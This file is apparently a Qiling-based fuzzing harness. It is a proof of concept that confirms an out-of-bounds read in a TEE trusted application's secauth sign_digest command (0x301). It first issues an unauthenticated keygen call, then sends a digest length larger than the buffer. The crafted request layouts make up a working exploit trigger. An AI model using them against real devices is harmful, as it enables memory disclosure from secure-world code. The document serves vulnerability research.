#from params import *
from .params import *
from pwn import *
from qiling import Qiling
import struct, os

# === secauth cmd 0x301 sign_digest OOB read — MULTI_CMD confirmation =======
# 0x301 signs a caller DIGEST directly; the OOB read is in TEE_AsymmetricSignDigest
# (digest=IN+0x28, dlen=[IN+0x24] attacker, unclamped vs 0x40C param size) but the
# sign op needs a loaded ASK key first. So under TAEMU_MULTI_CMD=2:
#   op idx 0 -> cmd 0x100 (keygen ASK for uid 0): creates secauth/ask_0.key
#   op idx 1 -> cmd 0x301 (sign_digest, dlen huge): the key now loads -> sign reads
#               dlen bytes from IN+0x28 -> OOB read past the 0x40C buffer.
# Both keygen and sign are UNAUTHENTICATED (no UUID ACL; bio gate skipped on 0x301).
# Run: TAEMU_MULTI_CMD=2 SA_LEN=0x4000 ./fuzz.sh <dir> <seed>

PTYPES = 0x65
INSZ   = 0x40C
OUTSZ  = 0x408
SA_LEN = int(os.environ.get("SA_LEN", str(0x4000)), 0) & 0xFFFFFFFF

def _keygen_ask(uid=0):
    # cmd 0x100 (256) keygen ASK: handler reads [IN+0x14]=alg (0=ECDSA), uid.
    buf = bytearray(INSZ)
    struct.pack_into("<I", buf, 0x00, 1)        # proto v1
    struct.pack_into("<I", buf, 0x14, 0)        # alg = 0 (ECDSA-P256; the only accepted)
    # uid field: the keygen reads uid from the request; keep 0 to match sign's uid 0.
    return bytes(buf)

def _sign_digest(length, uid=0):
    buf = bytearray(INSZ)
    struct.pack_into("<I", buf, 0x00, 1)        # proto v1
    struct.pack_into("<I", buf, 0x0c, 0)        # skip bio gate
    struct.pack_into("<I", buf, 0x18, 0)        # type=0 (ASK), and !=1 so no forced bio
    struct.pack_into("<I", buf, 0x10, 0)        # take sign path
    struct.pack_into("<I", buf, 0x1c, uid)      # uid 0
    struct.pack_into("<I", buf, 0x20, 0)        # user_id
    struct.pack_into("<I", buf, 0x24, length)   # digest len (ATTACKER, unclamped)
    buf[0x28:0x38] = b"D" * 0x10
    return bytes(buf)

def place_input_callback(ql: Qiling, input: bytes, idx: int):
    if idx <= 0:
        buf = _keygen_ask()
        print(f"[MC301 op0] cmd=0x100 keygen ASK uid=0")
        setup_params_fuzz(ql, 0x100, PTYPES,
            [MemRefParam(buf, INSZ), MemRefParam(bytes(OUTSZ), OUTSZ), NoneParam(), NoneParam()])
        return True
    else:
        buf = _sign_digest(SA_LEN)
        print(f"[MC301 op1] cmd=0x301 sign_digest dlen={SA_LEN:#x} (TEE_AsymmetricSignDigest OOB read)")
        setup_params_fuzz(ql, 0x301, PTYPES,
            [MemRefParam(buf, INSZ), MemRefParam(bytes(OUTSZ), OUTSZ), NoneParam(), NoneParam()])
        return True
